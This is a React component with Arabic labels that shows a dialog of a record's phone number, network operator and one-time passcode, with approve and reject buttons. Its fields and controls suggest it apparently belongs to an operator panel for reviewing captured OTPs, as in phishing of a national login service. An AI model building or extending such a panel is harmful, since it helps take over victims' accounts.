"use client";

import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Lock, Shield, User } from "lucide-react";
import { doc, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { toast } from "sonner";

interface NafazAuthDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  notification: any;
}

export function PhoneDialog({
  open,
  onOpenChange,
  notification,
  handleApproval,
}: any) {
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="bg-white dark:bg-red-800 border-0 shadow-2xl max-w-md rounded-xl"
        dir="rtl"
      >
        <DialogHeader className="border-b pb-3">
          <DialogTitle className="text-xl font-bold bg-gradient-to-r from-red-300 to-primary/80 text-transparent bg-clip-text">
            معلومات الهاتف
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-4 py-3">
          <div className="p-4 rounded-lg bg-gradient-to-r from-yellow-500 to-yellow-600 text-white shadow-lg">
            <div className="flex justify-between items-start mb-4">
              <div className="flex flex-col">
                معلومات الهاتف
                <span className="font-medium"></span>
              </div>
              <Shield className="h-8 w-8 text-white opacity-80" />
            </div>
          </div>

          <div className="space-y-4">
            <div className="grid gap-2">
              <Label htmlFor="username" className="text-right">
                الهاتف{" "}
              </Label>
              <div className="relative">
                <User className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  readOnly
                  id="username"
                  value={notification?.phone}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2">
              <Label htmlFor="password" className="text-right">
                مشغل الشبكة{" "}
              </Label>
              <div className="relative">
                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="password"
                  readOnly
                  value={notification?.operator}
                  className="pr-10"
                  dir="ltr"
                />
                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground mb-4" />
                <Label htmlFor="pin" className="text-right">
                  OTP
                </Label>{" "}
                <Input
                  id="password"
                  readOnly
                  value={notification?.phoneOtp}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2"></div>

            <div className="grid gap-2">
              <Label htmlFor="attachment" className="text-right"></Label>
            </div>
          </div>
        </div>

        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
          <Button
            onClick={() => handleApproval("approved", notification.id)}
            className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-white border-0 shadow-md"
          >
            موافقة
          </Button>
          <Button
            onClick={() => handleApproval("rejected", notification.id)}
            className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
          >
            رفض
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
